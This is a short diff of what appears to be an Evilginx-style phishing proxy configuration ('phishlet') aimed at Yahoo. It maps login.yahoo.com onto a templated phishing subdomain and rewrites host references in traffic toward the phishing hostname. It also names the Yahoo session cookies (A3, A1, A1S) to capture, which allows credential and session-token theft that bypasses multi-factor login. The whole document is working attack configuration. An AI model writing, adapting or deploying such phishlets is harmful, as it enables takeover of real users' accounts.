@@ -1,9 +1,9 @@
-name: 'service1'
+name: 'yahoo'
 min_ver: '3.0.0'
 proxy_hosts:
-  - {phish_sub: 'collector-{{.Endpoint1}}', orig_sub: 'login', domain: 'yahoo.com', session: true, is_landing: true}
+  - {phish_sub: '{{.Endpoint1}}', orig_sub: 'login', domain: 'yahoo.com', session: true, is_landing: true}
 sub_filters:
-  - {triggers_on: 'login.yahoo.com', orig_sub: 'login', domain: 'yahoo.com', phish_sub: 'collector-{{.Endpoint1}}', mimes: ['text/html', 'application/javascript', 'application/x-javascript', 'application/json']}
+  - {trg: 'login.yahoo.com', orig: 'login.yahoo.com', repl: '{{.Endpoint1}}.{hostname}', triggers_on: 'yahoo', search: '(.*)', type: 'header'}
 auth_tokens:
   - domain: '.yahoo.com'
     keys: ['A3', 'A1', 'A1S']
